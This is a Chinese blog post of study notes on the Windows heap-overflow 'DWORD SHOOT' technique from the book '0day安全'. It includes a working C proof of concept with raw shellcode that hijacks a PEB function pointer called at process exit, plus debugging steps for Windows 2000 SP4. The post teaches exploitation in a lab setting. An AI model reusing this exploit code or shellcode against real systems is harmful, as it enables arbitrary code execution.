---
layout: single
author_profile: true
comments: true
title: 堆溢出 arbitrary DWORD reset 入门
tagline: 学习笔记
categories: [Windows]
tags: [系统安全]
---
## 0.引言
arbitrary DWORD reset 在0day安全中叫做DWORD SHOOT，本文是参考《0 day安全》第5章的学习笔记。

arbitrary DWORD reset的攻击原理是，系统采用双向链表维护空闲堆块，通过溢出修改空闲堆块首部的pre和next指针，最后在申请该块时达到任意修改内存的目的。下面使用 的方法是：修改PEB 中的一个函数指针（进程结束时会调用），使它指向我们构造的shellcode，这样进程结束前会去执行shellcode.

## 1.双向链表组织空闲堆块
空闲堆块用双向链表组织，每个空闲堆块首部占16字节，前8个字节用于标识该块的相关信息（如块大小、是否占用等），后8字节用于存储pre和next两个指针。

当申请一个空闲堆块时，从双向链表删除的过程大致如下：
	
	int deleteNode(ListNode *node)
	{
		node->next->pre = node->pre;
		node->pre->next = node->next;
	}

## 2.arbitrary DWORD reset

### 2.1.覆盖空闲堆首部
假定一个堆A是已经申请的，堆B在A后面，是空闲的，如|—A—|—B—|
在向堆A中拷贝数据时，数据长度超出了堆A的大小，那么将覆盖堆B的首部，破坏了空闲堆双向链表结构。

	B->pre = (ListNode*)addr_x
	B->next = (ListNode*)addr_y

### 2.2.申请被覆盖的空闲堆
这时系统还是将堆块B从双向链表中删除（系统不知道双向链表结构被破坏），模拟deleteNode操作

	B->next->pre = B->pre
	B->pre->next = B->next

也就是

	((ListNode*)addr_y)->pre = (ListNode*)addr_x
	((ListNode*)addr_x)->next =  (ListNode*)addr_y

在addr_y开始的0~3字节处  存储addr_x
在addr_x开始的4~7字节处  存储addr_y

	addr_y[0~3] = addr_x
	addr_x[4~7] = addr_y

（注意ListNode不是空闲堆块的头部）

## 3.实例分析
{% highlight c %}
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
//repaire the pointer which shooted by heap over run
"\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020
"\xBB\x03\x91\xF8\x77"  //MOV EBX,77F89103 the address here may releated to your OS
"\x89\x18"				//MOV DWORD PTR DS:[EAX],EBX
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block
"\x88\x06\x36\x00\x20\xf0\xfd\x7f";
//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug 
//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()
//and will be called by ExitProcess() at last

main()
{
	
	HLOCAL h1 = 0, h2 = 0;
	HANDLE hp;
	hp = HeapCreate(0,0x1000,0x10000);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	//printf("%d\n",sizeof(shellcode)-1);
	//__asm int 3 //used to break the process
	//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap
	memcpy(h1,shellcode,0x200); //overflow,0x200=512
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	return 0;
}

{% endhighlight %}

### 3.1. 获取shellcode的起始地址，也就是堆块h1的地址
在源程序加入断点，OD打开exe程序，F9执行到断点处，发现EAX：0×00360688，即shellcode的起始地址，F8单步调试，执 行完REP MOVS DWORD….指令，它对应memcpy函数，可在内存0×00360688处看到shellcode的内容。

### 3.2. 获取RtlEnterCriticalSection()函数的地址，两个方法
1）在OllyDbg汇编区，Ctrl+G输入RtlEnterCriticalSection查找函数的地址；
2）《0day安全》书中说存储该函数指针的位置是固定的，0x7FFDF020，也可以在OD下方的内存区Ctrl+G输入7FFDF020查找该内存地址存储的内容，地址是 0x77f89103。


### 3.3. shellcode分析

shellcode有216字节，前200字节填充 大小为200字节的堆区h1，它后面紧跟着就是空闲堆块
	
	201~208字节存放堆块首部
	209~212字节存放shellcode的起始地址，需要实际调试确定，本实验是0×00360688
	213~216字节存放P.E.B函数指针的地址，即0x7FFDF020

### 3.4. 溢出

当执行完memcpy后，再申请空闲堆时，申请的是被覆盖的堆B

	B->next = 0×00360688
	B->pre = 0x7FFDF020

在从空闲堆双向链表中删除该堆块时，会在0×00360688处第4~7字节写入0x7FFDF020，这是shellcode前12字节为NOP的原因；   

在0x7FFDF020处第0~3字节写入0×00360688，进程结束时想去执行ExitProcess()时，会转而执行我们的shellcode。    

在执行shellcode时，为了让shellcode结束后调用ExitProcess()，在shellcode中又将0x77f89103写回0x7FFDF020处。  

## 注：

实验环境 winodws 2000 sp4，参考《0 day安全第二版》
